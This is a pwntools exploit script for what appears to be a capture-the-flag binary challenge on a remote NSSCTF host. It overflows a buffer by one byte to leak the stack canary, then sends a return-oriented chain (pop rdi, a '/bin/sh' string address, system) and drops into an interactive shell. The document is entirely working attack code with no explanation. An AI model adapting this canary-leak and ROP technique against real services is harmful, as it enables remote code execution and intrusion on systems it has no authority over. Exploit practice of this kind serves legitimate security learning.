from pwn import *
context(log_level="debug",arch="amd64",terminal=["tmux","siolitw","-h"])

io = remote("node3.anna.nssctf.cn",28668)
elf = ELF("./pwn")

sys_addr = 0x401284
sh_addr = 0x404058
pop_rdi = 0x4011de

io.sendafter(b"Go!!!\n", b"a"*0x29)
io.recvuntil(b"a"*0x29)
canary = u64(io.recv(7).rjust(8, b"\x00"))

payload=b"a"*0x28 + p64(canary) + p64(0) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
io.send(payload)

io.interactive()